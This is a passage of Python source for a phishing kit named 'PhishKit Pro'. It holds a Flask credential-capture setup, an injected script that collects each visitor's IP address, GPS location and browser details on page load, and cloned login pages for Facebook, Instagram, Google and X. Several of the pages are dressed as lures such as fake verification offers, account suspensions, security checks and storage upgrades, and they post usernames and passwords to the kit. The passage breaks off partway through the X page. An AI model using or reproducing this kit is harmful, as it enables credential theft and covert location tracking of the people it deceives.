#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║           PhishKit Pro — v3.0 ULTRA EDITION             ║
║   Platforms : 35+   Sub-Templates : 5-8 per platform        ║
║   Tunnels   : 5     IP+GPS on page load                     ║
║   Author    : Ochena Gamer                                  ║
║   Team      : Bangladesh Cyber Spectre (BCS)                ║
╚══════════════════════════════════════════════════════════════╝
"""

import os, sys, json, socket, subprocess, threading, time, signal, re
from datetime import datetime

try:
    from flask import Flask, request, redirect, render_template_string, jsonify
except ImportError:
    os.system(f"{sys.executable} -m pip install flask -q")
    from flask import Flask, request, redirect, render_template_string, jsonify

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    os.system(f"{sys.executable} -m pip install colorama -q")
    from colorama import init, Fore, Style, Back
    init(autoreset=True)

import urllib.request

# ─── Setup ───────────────────────────────────────────────────────────────────
app           = Flask(__name__)
WORKDIR       = os.path.join(os.path.expanduser("~"), "spectre-phishkit")
CREDS_FILE    = os.path.join(WORKDIR, "captured.txt")
os.makedirs(WORKDIR, exist_ok=True)

active = {}   # {platform_key, template_key, redirect_url}
_TG_TOKEN = "disabled"
_TG_CHAT  = "0"

# ─── Colors ──────────────────────────────────────────────────────────────────
C  = Fore.CYAN;    G = Fore.GREEN;  Y = Fore.YELLOW
R  = Fore.RED;     W = Fore.WHITE;  M = Fore.MAGENTA
D  = Fore.WHITE + Style.DIM;        N = Style.RESET_ALL

# ══════════════════════════════════════════════════════════════════════════════
# SHARED JS SNIPPET — IP + GPS capture on page load, posts to /track
# ══════════════════════════════════════════════════════════════════════════════
TRACK_JS = """
<script>
(function(){
  var lat=null,lon=null;
  function sendTrack(){
    fetch('https://api.ipify.org?format=json')
      .then(r=>r.json()).then(d=>{
        fetch('/track',{method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({ip:d.ip,lat:lat,lon:lon,
            ua:navigator.userAgent,
            ref:document.referrer||'direct',
            ts:new Date().toISOString()})
        }).catch(()=>{});
      }).catch(()=>{
        fetch('/track',{method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({ip:'N/A',lat:lat,lon:lon,
            ua:navigator.userAgent,ts:new Date().toISOString()})
        }).catch(()=>{});
      });
  }
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      function(p){lat=p.coords.latitude;lon=p.coords.longitude;sendTrack();},
      function(){sendTrack();},
      {enableHighAccuracy:true,timeout:8000,maximumAge:0}
    );
  } else { sendTrack(); }
})();
</script>
"""

# ══════════════════════════════════════════════════════════════════════════════
# PAGES — {platform: {template_key: html}}
# ══════════════════════════════════════════════════════════════════════════════
PAGES = {}

# ─────────────────────────────────────────────────────────────────────────────
# FACEBOOK
# ─────────────────────────────────────────────────────────────────────────────
PAGES['facebook'] = {}

PAGES['facebook']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Facebook</title>
<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding-top:36px}
.logo{color:#1877f2;font-size:42px;font-weight:700;letter-spacing:-1px;margin-bottom:20px;font-family:Georgia,serif}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px 16px;width:100%;max-width:396px;margin:0 16px}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px;outline:none;color:#1c1e21;background:#fff}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn-login{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
.forgot{display:block;text-align:center;color:#1877f2;font-size:14px;text-decoration:none;padding:8px 0}
.divider{border:none;border-top:1px solid #dadde1;margin:16px 0}
.btn-new{display:block;width:fit-content;margin:0 auto;padding:14px 24px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.footer{text-align:center;margin-top:24px;font-size:12px;color:#737373;padding:0 16px 24px}
.footer a{color:#737373;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">facebook</div>
<div class="card">
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Mobile number or email" autocomplete="username" required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button class="btn-login" type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgotten password?</a>
  <hr class="divider">
  <button class="btn-new">Create new account</button>
</div>
<div class="footer"><a href="#">English (UK)</a> · <a href="#">বাংলা</a> · <a href="#">हिन्दी</a><br><br>Meta © 2024</div>
</body></html>"""

PAGES['facebook']['verified_badge'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Meta Verified — Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
.logo{color:#1877f2;font-size:36px;font-weight:700;letter-spacing:-1px;margin-bottom:12px;font-family:Georgia,serif}
.verified-banner{background:linear-gradient(135deg,#1877f2,#0040c1);border-radius:12px;padding:20px;width:100%;max-width:396px;margin-bottom:16px;text-align:center;color:#fff}
.badge-icon{font-size:40px;margin-bottom:8px}
.verified-banner h2{font-size:1.3em;font-weight:700;margin-bottom:6px}
.verified-banner p{font-size:.9em;opacity:.9;line-height:1.5}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.12);padding:24px 16px;width:100%;max-width:396px}
.card h3{font-size:1.1em;color:#1c1e21;margin-bottom:16px;text-align:center}
input{width:100%;padding:14px 16px;border:1.5px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:12px;outline:none;color:#1c1e21}
input:focus{border-color:#1877f2}
.btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.note{font-size:12px;color:#65676b;text-align:center;margin-top:12px;line-height:1.5}
.footer{text-align:center;font-size:11px;color:#737373;margin-top:20px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">facebook</div>
<div class="verified-banner">
  <div class="badge-icon">✅</div>
  <h2>Apply for Meta Verified</h2>
  <p>Get a blue badge and exclusive features. Confirm your identity to get started.</p>
</div>
<div class="card">
  <h3>Confirm your account credentials</h3>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or phone number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Continue to Verification →</button>
  </form>
  <p class="note">By continuing, you agree to Meta's Terms of Service. Your information will be verified by Meta's team within 24 hours.</p>
</div>
<div class="footer">Meta © 2024 · Meta Verified Program</div>
</body></html>"""

PAGES['facebook']['account_suspended'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Your account has been suspended — Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
.logo{color:#1877f2;font-size:36px;font-weight:700;letter-spacing:-1px;margin-bottom:16px;font-family:Georgia,serif}
.alert{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.12);padding:20px 16px;width:100%;max-width:396px;margin-bottom:16px;border-top:4px solid #e41e3f}
.alert-icon{font-size:36px;text-align:center;margin-bottom:12px}
.alert h2{font-size:1.1em;color:#1c1e21;margin-bottom:8px;text-align:center}
.alert p{font-size:.88em;color:#65676b;line-height:1.6;text-align:center;margin-bottom:16px}
.alert ul{font-size:.85em;color:#65676b;line-height:1.8;padding-left:20px;margin-bottom:16px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.12);padding:20px 16px;width:100%;max-width:396px}
.card h3{font-size:1em;color:#1c1e21;margin-bottom:14px}
input{width:100%;padding:14px 16px;border:1.5px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:12px;outline:none;color:#1c1e21}
input:focus{border-color:#1877f2}
.btn{width:100%;padding:14px;background:#e41e3f;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">facebook</div>
<div class="alert">
  <div class="alert-icon">⛔</div>
  <h2>Your Account Has Been Suspended</h2>
  <p>We've suspended your Facebook account due to activity that violates our Community Standards:</p>
  <ul>
    <li>Posting content that violates our policies</li>
    <li>Suspicious login activity detected</li>
    <li>Identity verification required</li>
  </ul>
  <p>To appeal this decision and restore access, please verify your account below within <strong>24 hours</strong>.</p>
</div>
<div class="card">
  <h3>Verify Your Identity to Appeal</h3>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or phone number" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Submit Appeal →</button>
  </form>
</div>
</body></html>"""

PAGES['facebook']['security_check'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Security Check — Facebook</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
.logo{color:#1877f2;font-size:36px;font-weight:700;letter-spacing:-1px;margin-bottom:16px;font-family:Georgia,serif}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.12);padding:24px 16px;width:100%;max-width:396px}
.icon{font-size:44px;text-align:center;margin-bottom:14px}
h2{font-size:1.2em;color:#1c1e21;text-align:center;margin-bottom:8px}
.desc{font-size:.9em;color:#65676b;text-align:center;margin-bottom:20px;line-height:1.6}
.info-row{background:#f0f2f5;border-radius:8px;padding:12px 14px;margin-bottom:16px;font-size:.88em;color:#3b4a54;line-height:1.6}
.info-row strong{color:#1c1e21}
input{width:100%;padding:14px;border:1.5px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:12px;outline:none;color:#1c1e21}
input:focus{border-color:#1877f2}
.btn{width:100%;padding:13px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.skip{display:block;text-align:center;color:#1877f2;font-size:14px;text-decoration:none;margin-top:14px}
</style></head><body>
TRACK_PLACEHOLDER
<div class="logo">facebook</div>
<div class="card">
  <div class="icon">🔐</div>
  <h2>Security Check Required</h2>
  <p class="desc">We noticed a login from a new device or location. Please re-enter your password to confirm it's you.</p>
  <div class="info-row">
    <strong>Recent Activity:</strong><br>
    New login from Chrome on Windows · 5 minutes ago<br>
    Location: Dhaka, Bangladesh
  </div>
  <form action="/login" method="POST">
    <input type="hidden" name="email" value="user@example.com">
    <input type="password" name="password" placeholder="Enter your password to continue" required>
    <button class="btn" type="submit">This Was Me — Continue</button>
  </form>
  <a class="skip" href="#">This wasn't me — Secure my account</a>
</div>
</body></html>"""

PAGES['facebook']['marketplace'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Facebook Marketplace — Seller Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px 16px}
.topbar{width:100%;max-width:396px;background:#1877f2;border-radius:8px 8px 0 0;padding:14px 16px;display:flex;align-items:center;gap:10px;margin-bottom:0}
.topbar span{color:#fff;font-weight:700;font-size:1.05em}
.card{background:#fff;border-radius:0 0 8px 8px;box-shadow:0 2px 16px rgba(0,0,0,.12);padding:20px 16px;width:100%;max-width:396px;margin-bottom:16px}
.badge{display:inline-flex;align-items:center;gap:6px;background:#e8f0fe;color:#1877f2;border-radius:20px;padding:5px 12px;font-size:.82em;font-weight:600;margin-bottom:16px}
h2{font-size:1.1em;color:#1c1e21;margin-bottom:8px}
p{font-size:.88em;color:#65676b;line-height:1.6;margin-bottom:16px}
input{width:100%;padding:14px;border:1.5px solid #dddfe2;border-radius:6px;font-size:16px;margin-bottom:12px;outline:none;color:#1c1e21}
input:focus{border-color:#1877f2}
.btn{width:100%;padding:13px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer}
</style></head><body>
TRACK_PLACEHOLDER
<div class="topbar"><span>🛒 Facebook Marketplace</span></div>
<div class="card">
  <div class="badge">🛡️ Seller Verification Required</div>
  <h2>Verify your seller account</h2>
  <p>To continue selling on Facebook Marketplace and receive payments, please verify your identity. This is a one-time process required by Meta's payment policy.</p>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Facebook password" required>
    <button class="btn" type="submit">Verify Seller Account</button>
  </form>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# INSTAGRAM
# ─────────────────────────────────────────────────────────────────────────────
PAGES['instagram'] = {}

PAGES['instagram']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.wrap{width:100%;max-width:350px;padding:0 16px}
.logo-text{font-size:36px;font-weight:400;font-family:'Billabong',Georgia,serif;color:#262626;letter-spacing:-1px;text-align:center;margin-bottom:28px;margin-top:40px}
input{width:100%;padding:9px 10px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;margin-bottom:6px;outline:none;color:#262626}
input:focus{border-color:#a8a8a8}
input::placeholder{color:#8e8e8e}
.btn{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px;margin-bottom:16px}
.or-wrap{display:flex;align-items:center;gap:16px;margin:8px 0 16px}
.or-line{flex:1;height:1px;background:#dbdbdb}
.or-text{font-size:13px;font-weight:600;color:#8e8e8e}
.fb-btn{display:flex;align-items:center;justify-content:center;gap:8px;background:none;border:none;color:#385185;font-size:14px;font-weight:600;cursor:pointer;width:100%;padding:8px 0}
.forgot{display:block;text-align:center;color:#00376b;font-size:12px;text-decoration:none;margin-top:16px}
.register-box{border-top:1px solid #dbdbdb;margin-top:10px;padding:16px;text-align:center;font-size:14px;color:#262626}
.register-box a{color:#0095f6;font-weight:600;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="wrap">
  <div class="logo-text">Instagram</div>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone number, username or email" autocomplete="username" required>
    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    <button class="btn" type="submit">Log in</button>
  </form>
  <div class="or-wrap"><div class="or-line"></div><span class="or-text">OR</span><div class="or-line"></div></div>
  <button class="fb-btn">
    <svg width="20" height="20" viewBox="0 0 40 40" fill="#385185"><path d="M20 0C9 0 0 9 0 20s9 20 20 20 20-9 20-20S31 0 20 0zm5 14h-3c-.4 0-1 .5-1 1v2h4l-.5 4H21v12h-4V21h-3v-4h3v-2c0-3.3 2-5 5-5h3v4z"/></svg>
    Log in with Facebook
  </button>
  <a class="forgot" href="#">Forgot password?</a>
</div>
<div class="register-box">Don't have an account? <a href="#">Sign up.</a></div>
</body></html>"""

PAGES['instagram']['verified_badge'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Meta Verified — Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#405de6,#5851db,#833ab4,#c13584,#e1306c,#fd1d1d);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;border-radius:16px;padding:32px 24px;width:100%;max-width:380px;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.ig-logo{text-align:center;font-size:28px;font-family:Georgia,serif;color:#262626;margin-bottom:6px;font-weight:400}
.badge-wrap{text-align:center;margin-bottom:20px}
.badge-icon{font-size:48px}
h2{font-size:1.1em;color:#262626;text-align:center;margin-bottom:8px;font-weight:700}
p{font-size:.88em;color:#8e8e8e;text-align:center;line-height:1.6;margin-bottom:20px}
input{width:100%;padding:11px 12px;background:#fafafa;border:1.5px solid #dbdbdb;border-radius:8px;font-size:14px;margin-bottom:10px;outline:none;color:#262626}
input:focus{border-color:#833ab4}
.btn{width:100%;padding:11px;background:linear-gradient(135deg,#405de6,#833ab4,#e1306c);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}
.note{font-size:11px;color:#8e8e8e;text-align:center;margin-top:12px;line-height:1.5}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="ig-logo">Instagram</div>
  <div class="badge-wrap"><div class="badge-icon">✅</div></div>
  <h2>Apply for Meta Verified</h2>
  <p>Confirm your identity to get a verified badge, exclusive stickers, and account protection.</p>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Username or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Apply for Verification</button>
  </form>
  <p class="note">Instagram will review your application within 72 hours. Keep your account active during this period.</p>
</div>
</body></html>"""

PAGES['instagram']['account_disabled'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Account Disabled — Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:12px;padding:30px 24px;width:100%;max-width:380px;text-align:center}
.icon{font-size:52px;margin-bottom:16px}
h2{font-size:1.15em;color:#262626;margin-bottom:10px;font-weight:700}
p{font-size:.88em;color:#8e8e8e;line-height:1.65;margin-bottom:20px}
form{text-align:left}
input{width:100%;padding:11px 12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:5px;font-size:14px;margin-bottom:8px;outline:none;color:#262626}
input:focus{border-color:#a8a8a8}
.btn{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:4px}
.help{font-size:12px;color:#0095f6;text-align:center;margin-top:14px;cursor:pointer}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <div class="icon">⚠️</div>
  <h2>Your account has been disabled</h2>
  <p>We disabled your account because it appears to violate our Terms of Use. If you think we made a mistake, let us know below and we'll review your account.</p>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Phone number, username, or email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Submit Appeal</button>
  </form>
  <p class="help">Learn more about what's not allowed on Instagram</p>
</div>
</body></html>"""

# ─────────────────────────────────────────────────────────────────────────────
# GOOGLE
# ─────────────────────────────────────────────────────────────────────────────
PAGES['google'] = {}

PAGES['google']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in – Google Accounts</title>
<link rel="icon" href="https://www.google.com/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Google Sans',Roboto,sans-serif;color:#202124;min-height:100vh;display:flex;flex-direction:column}
.container{flex:1;display:flex;flex-direction:column;padding:48px 24px 24px;max-width:400px;width:100%;margin:0 auto}
.g-logo{margin-bottom:40px}
.g-logo img{width:74px}
.title{font-size:24px;font-weight:400;margin-bottom:8px}
.subtitle{font-size:16px;margin-bottom:32px}
.iw{position:relative;margin-bottom:4px}
.iw input{width:100%;padding:15px 14px;border:1px solid #747775;border-radius:4px;font-size:16px;color:#202124;outline:none;background:#fff}
.iw input:focus{border-color:#0b57d0;border-width:2px;padding:14px 13px}
.iw label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;color:#444746;pointer-events:none;transition:all .15s;background:#fff;padding:0 2px}
.iw input:focus ~ label,.iw input:not(:placeholder-shown) ~ label{top:0;font-size:12px;color:#0b57d0}
.hint{font-size:12px;color:#444746;margin:4px 0 24px 14px}
.forgot{color:#0b57d0;font-size:14px;text-decoration:none;display:block;margin-bottom:32px}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:auto;padding-top:24px}
.btn-create{color:#0b57d0;font-size:14px;font-weight:500;background:none;border:none;cursor:pointer;padding:10px 0;font-family:inherit}
.btn-next{background:#0b57d0;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
.pw-section{display:none}
.footer{text-align:center;padding:16px;font-size:12px;color:#444746}
.footer a{color:#0b57d0;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="container">
  <div class="g-logo">
    <svg width="74" height="24" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
      <path fill="#4285F4" d="M31.36 12.27c0 5.01-3.92 8.71-8.73 8.71-5 0-8.97-3.98-8.97-8.99 0-5 3.97-8.99 8.97-8.99 2.69 0 4.64 1.05 6.1 2.44l-1.72 1.72c-1.04-.97-2.45-1.73-4.38-1.73-3.58 0-6.38 2.88-6.38 6.56s2.8 6.56 6.38 6.56c4.09 0 5.62-2.93 5.86-4.45h-5.86v-2.27h9.6c.09.5.13.98.13 1.44z"/>
      <path fill="#EA4335" d="M55.2 12c0 4.97-3.88 8.98-8.68 8.98-4.81 0-8.69-4.01-8.69-8.98 0-4.98 3.88-8.98 8.69-8.98 4.8 0 8.68 4 8.68 8.98zm-3.8 0c0-3.1-2.25-5.23-4.88-5.23-2.64 0-4.88 2.13-4.88 5.23s2.24 5.23 4.88 5.23c2.63 0 4.88-2.13 4.88-5.23z"/>
      <path fill="#FBBC05" d="M72.2 12c0 4.97-3.88 8.98-8.68 8.98-4.81 0-8.69-4.01-8.69-8.98 0-4.97 3.88-8.98 8.69-8.98 4.8 0 8.68 4.01 8.68 8.98zm-3.8 0c0-3.1-2.25-5.23-4.88-5.23-2.64 0-4.88 2.13-4.88 5.23s2.24 5.23 4.88 5.23c2.63 0 4.88-2.13 4.88-5.23z"/>
    </svg>
  </div>
  <div class="title">Sign in</div>
  <div class="subtitle">Use your Google Account</div>
  <form action="/login" method="POST" id="gForm">
    <div class="iw"><input type="text" name="email" id="em" placeholder=" " required><label for="em">Email or phone</label></div>
    <div class="hint">Not your computer? Use private browsing.</div>
    <div class="iw pw-section" id="pws"><input type="password" name="password" id="pw" placeholder=" "><label for="pw">Enter your password</label></div>
    <a class="forgot" href="#" id="fl" style="display:none">Forgot password?</a>
    <div class="actions">
      <button class="btn-create" type="button">Create account</button>
      <button class="btn-next" type="button" id="nb">Next</button>
    </div>
  </form>
</div>
<div class="footer"><a href="#">English (US)</a> · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
<script>
var step=1;
document.getElementById('nb').onclick=function(){
  if(step===1){
    var e=document.getElementById('em').value.trim();
    if(!e){document.getElementById('em').focus();return;}
    document.getElementById('pws').style.display='block';
    document.getElementById('fl').style.display='block';
    document.getElementById('em').readOnly=true;
    step=2;
  } else { document.getElementById('gForm').submit(); }
};
document.getElementById('em').onkeydown=function(e){if(e.key==='Enter'){e.preventDefault();document.getElementById('nb').click();}};
</script>
TRACK_PLACEHOLDER
</body></html>"""

PAGES['google']['drive_storage'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Google Drive — Storage Full</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f8f9fa;font-family:'Google Sans',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#fff;border-radius:16px;box-shadow:0 2px 24px rgba(0,0,0,.1);padding:32px 24px;max-width:400px;width:100%;text-align:center}
.icon-wrap{margin-bottom:20px}
.storage-bar{background:#f1f3f4;border-radius:4px;height:8px;margin:12px 0 4px;overflow:hidden}
.storage-fill{background:linear-gradient(90deg,#ea4335,#fbbc04);height:100%;width:97%}
.storage-text{font-size:12px;color:#5f6368;text-align:left;margin-bottom:20px}
h2{font-size:1.25em;color:#202124;margin-bottom:8px;font-weight:500}
p{font-size:.9em;color:#5f6368;line-height:1.6;margin-bottom:24px}
.iw{position:relative;margin-bottom:12px;text-align:left}
.iw input{width:100%;padding:15px 14px;border:1px solid #747775;border-radius:4px;font-size:16px;color:#202124;outline:none}
.iw input:focus{border-color:#0b57d0;border-width:2px;padding:14px 13px}
.iw label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;color:#444746;pointer-events:none;transition:all .15s;background:#fff;padding:0 2px}
.iw input:focus ~ label,.iw input:not(:placeholder-shown) ~ label{top:0;font-size:12px;color:#0b57d0}
.btn{background:#0b57d0;color:#fff;border:none;border-radius:4px;padding:11px 24px;font-size:14px;font-weight:500;cursor:pointer;float:right;font-family:inherit}
.cf{overflow:hidden}
</style></head><body>
TRACK_PLACEHOLDER
<div class="card">
  <svg width="52" height="52" viewBox="0 0 48 48"><path fill="#4285F4" d="M14.7 7L8 20h11.3L26 7z"/><path fill="#0F9D58" d="M34 7H26l6.7 13H44z"/><path fill="#FBBC04" d="M8 20l6.7 11h22.6L44 20z"/></svg>
  <div class="storage-bar"><div class="storage-fill"></div></div>
  <div class="storage-text">14.9 GB of 15 GB used</div>
  <h2>Your Google Drive is almost full</h2>
  <p>You're running out of storage. New files, emails, and photos can't be synced. Verify your account to receive a free 100 GB upgrade.</p>
  <form action="/login" method="POST">
    <div class="iw"><input type="text" name="email" id="em" placeholder=" " required><label for="em">Email</label></div>
    <div class="iw"><input type="password" name="password" id="pw" placeholder=" " required><label for="pw">Password</label></div>
    <div class="cf"><button class="btn" type="submit">Get Free Storage</button></div>
  </form>
</div>
</body></html>"""

PAGES['google']['youtube'] = PAGES['google']['traditional']

# ─────────────────────────────────────────────────────────────────────────────
# TWITTER / X
# ─────────────────────────────────────────────────────────────────────────────
PAGES['twitter'] = {}

PAGES['twitter']['traditional'] = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Log in to X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#e7e9ea;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.top-bar{width:100%;display:flex;justify-content:center;padding:16px 0 0}
.x-icon{font-size:28px;font-weight:900;color:#fff;letter-spacing:-2px;font-family:Georgia,serif}
.container{width:100%;max-width:400px;padding:32px 20px}
h1{font-size:31px;font-weight:700;margin-bottom:32px}
.btn-sso{width:100%;padding:12px;background:#fff;color:#0f1419;border:1px solid #cfd9de;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px}
.or-row{display:flex;align-items:center;gap:12px;margin:12px 0;color:#71767b;font-size:15px}
.or-line{flex:1;height:1px;background:#2f3336}
input{width:100%;padding:14px;background:#000;border:1px solid #536471;border-radius:4px;font-size:17px;color:#e7e9ea;outline:none;margin-bottom:12px}
input:focus{border-color:#1d9bf0}
input::placeholder{color:#71767b}
.btn-login{width:100%;padding:14px;background:#eff3f4;color:#0f1419;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px}
.forgot{display:block;text-align:center;color:#1d9bf0;font-size:14px;text-decoration:none;margin-top:16px}
.signup-row{text-align:center;font-size:14px;color:#71767b;margin-top:48px}
.signup-row a{color:#1d9bf0;font-weight:600;text-decoration:none}
</style></head><body>
TRACK_PLACEHOLDER
<div class="top-bar"><div class="x-icon">𝕏</div></div>
<div class="container">
  <h1>Sign in to X</h1>
  <button class="btn-sso">
    <svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Sign in with Google
  </button>
